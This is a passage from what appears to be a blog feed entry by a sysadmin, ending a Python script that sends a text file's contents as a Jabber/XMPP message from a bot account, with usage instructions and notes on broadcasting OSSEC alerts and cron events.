</span><span class='line'><span class="n">tojid</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">array</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'><span class="n">m</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">msg</span><span class="o">=</span><span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">record</span> <span class="ow">in</span> <span class="n">array</span><span class="p">:</span>
</span><span class='line'>        <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span> <span class="o">+</span> <span class="n">record</span>
</span><span class='line'>
</span><span class='line'><span class="c"># configure your jabber account for the bot here.</span>
</span><span class='line'><span class="n">username</span> <span class="o">=</span> <span class="s">&#39;jabber_bot@jabber.server&#39;</span> <span class="c"># from whom will the message be sent</span>
</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="s">&#39;jabber_bot_secret_password&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">jid</span><span class="o">=</span><span class="n">xmpp</span><span class="o">.</span><span class="n">protocol</span><span class="o">.</span><span class="n">JID</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># for debugging purposes, uncomment the below line so that &#39;debug&#39; is 1.</span>
</span><span class='line'><span class="c"># This makes the script very verbose though, but its helpful if you stuck ^^</span>
</span><span class='line'><span class="c">#cl=xmpp.Client(jid.getDomain(),debug=1)</span>
</span><span class='line'><span class="n">cl</span><span class="o">=</span><span class="n">xmpp</span><span class="o">.</span><span class="n">Client</span><span class="p">(</span><span class="n">jid</span><span class="o">.</span><span class="n">getDomain</span><span class="p">(),</span><span class="n">debug</span><span class="o">=</span><span class="p">[])</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Sadly I don&#39;t have a valid certificate for my jabber server, so this had to</span>
</span><span class='line'><span class="c"># be set to False. I do however recommend, if you can, to get a valid certificate</span>
</span><span class='line'><span class="c"># and enable this</span>
</span><span class='line'><span class="n">con</span><span class="o">=</span><span class="n">cl</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">secure</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="c"># Set this to validate the servers certificate.</span>
</span><span class='line'><span class="k">if</span> <span class="ow">not</span> <span class="n">con</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Could not connect&quot;</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># authenticate the client</span>
</span><span class='line'><span class="n">auth</span><span class="o">=</span><span class="n">cl</span><span class="o">.</span><span class="n">auth</span><span class="p">(</span><span class="n">jid</span><span class="o">.</span><span class="n">getNode</span><span class="p">(),</span><span class="n">password</span><span class="p">,</span><span class="n">resource</span><span class="o">=</span><span class="n">jid</span><span class="o">.</span><span class="n">getResource</span><span class="p">())</span>
</span><span class='line'><span class="k">if</span> <span class="ow">not</span> <span class="n">auth</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Authentication failed&quot;</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send the message</span>
</span><span class='line'><span class="nb">id</span><span class="o">=</span><span class="n">cl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">xmpp</span><span class="o">.</span><span class="n">protocol</span><span class="o">.</span><span class="n">Message</span><span class="p">(</span><span class="n">tojid</span><span class="p">,</span> <span class="n">msg</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># some older servers will not send the message if you disconnect immediately</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h3>We have the code, now use it!</h3>

<p>Save this code to something like <code>jabbersend.py</code> and execute it like this:
<code>python jabbersend.py all@broadcast.jabber.server message_file.txt</code></p>

<p>If all went OK, you should have received a message from <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#106;&#x61;&#x62;&#x62;&#101;&#x72;&#95;&#98;&#111;&#x74;&#x40;&#106;&#x61;&#98;&#x62;&#x65;&#114;&#x2e;&#x73;&#x65;&#x72;&#118;&#x65;&#114;">&#106;&#x61;&#x62;&#98;&#101;&#x72;&#95;&#98;&#x6f;&#116;&#64;&#x6a;&#x61;&#98;&#x62;&#x65;&#x72;&#x2e;&#115;&#101;&#x72;&#x76;&#x65;&#x72;</a> :P</p>

<p>Our internal implementation of this has been used in multiple areas. From broadcasting OSSEC alerts to broadcasting important events from cronjobs.
The OSSEC broadcasting I&rsquo;ll blog a little later, but you can obviously see the value that something like this brings. No more missing emails, if I receive a message from the bot, its important :)</p>

<p>I have a slightly more matured version of this in a python module that I&rsquo;ll share later. If you are interested in this, poke me on twitter @leonjza</p>
]]></content>
  </entry>
  
</feed>
